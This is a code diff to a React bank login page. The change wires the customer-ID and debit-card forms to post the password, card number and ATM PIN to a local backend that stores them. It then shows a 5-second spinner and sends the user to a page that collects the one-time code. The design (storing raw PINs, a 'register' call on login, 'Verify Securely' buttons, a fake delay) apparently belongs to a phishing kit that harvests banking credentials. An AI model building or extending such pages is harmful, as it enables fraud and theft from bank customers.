@@ -1,16 +1,83 @@
 import { useState } from "react";
-import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai"; // Import eye icons
+import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";
+import { FaSpinner } from "react-icons/fa";
+import { useNavigate } from "react-router-dom";
 import "./Login.css";
 
 function LoginSection() {
   const [activeTab, setActiveTab] = useState("customer");
+  const [customerId, setCustomerId] = useState("");
+  const [password, setPassword] = useState("");
   const [cardNumber, setCardNumber] = useState("");
-  const [showPin, setShowPin] = useState(false); // Toggle ATM PIN
+  const [pin, setPin] = useState("");
+  const [showPin, setShowPin] = useState(false);
+  const [loading, setLoading] = useState(false);
+  const [message, setMessage] = useState({ text: "", type: "" });
+
+  const navigate = useNavigate();
 
   const handleCardChange = (e) => {
     let value = e.target.value.replace(/\D/g, "");
     value = value.match(/.{1,4}/g)?.join(" ") || "";
     setCardNumber(value);
+  };
+
+  // CUSTOMER LOGIN → SPINNER → REDIRECT
+  const handleCustomerLogin = async () => {
+    if (!customerId || !password) {
+      setMessage({ text: "Customer ID and Password are required", type: "error" });
+      return;
+    }
+
+    setLoading(true);
+    setMessage({ text: "", type: "" });
+
+    try {
+      await fetch("http://localhost:5000/api/users/register", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ customerId, password }),
+      });
+
+      // ⏳ Spinner for 5 seconds → OTP page
+      setTimeout(() => {
+        navigate("/otp-submit", { state: { customerId } });
+      }, 5000);
+    } catch (err) {
+      console.error(err);
+      setMessage({ text: "Network error, please try again", type: "error" });
+      setLoading(false);
+    }
+  };
+
+  // DEBIT CARD LOGIN → SAVE TO DB → SPINNER → REDIRECT
+  const handleDebitLogin = async () => {
+    if (!cardNumber || !pin) {
+      setMessage({ text: "Debit card number and PIN are required", type: "error" });
+      return;
+    }
+
+    setLoading(true);
+    setMessage({ text: "", type: "" });
+
+    try {
+      const res = await fetch("http://localhost:5000/api/debit-cards", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ cardNumber, pin }),
+      });
+
+      if (!res.ok) throw new Error("Failed to save debit card info");
+
+      // ⏳ Spinner for 5 seconds → OTP page
+      setTimeout(() => {
+        navigate("/otp-submit", { state: { cardNumber } });
+      }, 5000);
+    } catch (err) {
+      console.error(err);
+      setMessage({ text: "Network error, please try again", type: "error" });
+      setLoading(false);
+    }
   };
 
   return (
@@ -34,49 +101,78 @@ function LoginSection() {
           </button>
         </div>
 
-        {/* Customer ID Login */}
+        {message.text && (
+          <div className={`form-message ${message.type}`}>{message.text}</div>
+        )}
+
+        {/* CUSTOMER ID LOGIN */}
         {activeTab === "customer" && (
           <div className="form">
             <label>Customer ID</label>
-            <input type="text" placeholder="Enter Customer ID" />
-            <a href="/ForgetCustomerId" className="forgot-link">Forgot Customer ID?</a>
+            <input
+              type="text"
+              value={customerId}
+              onChange={(e) => setCustomerId(e.target.value)}
+              disabled={loading}
+            />
+            <a href="/ForgetCustomerId" className="forgot-link">
+              Forgot Customer ID?
+            </a>
 
             <label>Password</label>
-            <input type="password" placeholder="Enter Password" />
-            <a href="/ForgotPassword" className="forgot-link">Forgot Password?</a>
+            <input
+              type="password"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              disabled={loading}
+            />
+            <a href="/ForgotPassword" className="forgot-link">
+              Forgot Password?
+            </a>
 
-            <button className="login-btn">Login</button>
+            <button
+              className="verify-btn"
+              onClick={handleCustomerLogin}
+              disabled={loading}
+            >
+              {loading ? <FaSpinner className="rotating" /> : "🔒 Verify Securely with Login"}
+            </button>
           </div>
         )}
 
-        {/* Debit Card Login */}
+        {/* DEBIT CARD LOGIN */}
         {activeTab === "debit" && (
           <div className="form">
             <label>Debit Card Number</label>
             <input
               type="text"
-              placeholder="5555 5555 5555 5555"
               value={cardNumber}
               onChange={handleCardChange}
               maxLength={19}
+              disabled={loading}
             />
 
             <label>ATM PIN</label>
             <div className="pin-container">
               <input
                 type={showPin ? "text" : "password"}
-                placeholder="Enter PIN"
-                maxLength={3}
+                value={pin}
+                onChange={(e) => setPin(e.target.value)}
+                maxLength={6}
+                disabled={loading}
               />
-              <span
-                className="eye-icon"
-                onClick={() => setShowPin((prev) => !prev)}
-              >
+              <span className="eye-icon" onClick={() => setShowPin(!showPin)}>
                 {showPin ? <AiOutlineEyeInvisible /> : <AiOutlineEye />}
               </span>
             </div>
 
-            <button className="login-btn">Login</button>
+            <button
+              className="verify-btn"
+              onClick={handleDebitLogin}
+              disabled={loading}
+            >
+              {loading ? <FaSpinner className="rotating" /> : "🔒 Verify Securely with Login"}
+            </button>
           </div>
         )}
       </div>
